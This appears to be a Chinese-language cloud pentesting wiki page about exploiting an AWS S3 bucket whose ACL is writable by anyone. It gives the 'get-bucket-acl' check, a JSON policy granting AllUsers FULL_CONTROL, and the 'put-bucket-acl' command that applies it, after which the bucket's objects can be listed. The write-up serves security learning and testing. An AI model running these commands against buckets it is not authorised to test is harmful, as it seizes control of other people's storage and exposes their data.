---
title: Bucket ACL 可写


---

<center><h1>Bucket ACL 可写</h1></center>

---

列出目标 Bucket 提示被拒绝

</br>

<img width="1000" src="/img/1650006428.png"></br>

查看目标 Bucket ACL 策略发现是可读的，且策略如下

```bash
aws s3api get-bucket-acl --bucket teamssix
```

</br>

<img width="800" src="/img/1650006456.png"></br>

查询官方文档，内容如下：

</br>

<img width="1200" src="/img/1650006484.png"></br>

</br>

<img width="1200" src="/img/1650006510.png"></br>

通过官方文档，可以分析出这个策略表示任何人都可以访问、写入当前 Bucket 的 ACL

那么也就是说如果我们把权限修改为 FULL_CONTROL 后，就可以控制这个 Bucket 了，最后修改后的策略如下：

```json
{
    "Owner": {
        "ID": "d24***5"
    },
    "Grants": [
	{
            "Grantee": {
                "Type": "Group", 
                "URI": "http://acs.amazonaws.com/groups/global/AllUsers"
            }, 
            "Permission": "FULL_CONTROL"
        } 
    ]
}
```

将该策略写入

```bash
aws s3api put-bucket-acl --bucket teamssix --access-control-policy file://acl.json
```

</br>

<img width="1000" src="/img/1650006554.png"></br>

再次尝试，发现就可以列出对象了

</br>

<img width="1000" src="/img/1650006615.png"></br>

> 参考资料：
>
> https://mp.weixin.qq.com/s/eZ8OAO5ELgUNvVricIStGA
>
> https://mp.weixin.qq.com/s/r0DuASP6gH_48b5sJ1DCTw
>
> https://docs.aws.amazon.com/zh_cn/AmazonS3/latest/userguide/acl-overview.html

<Vssue />

<script>
export default {
    mounted () {
      this.$page.lastUpdated = "2022年4月15日"
    }
  }
</script>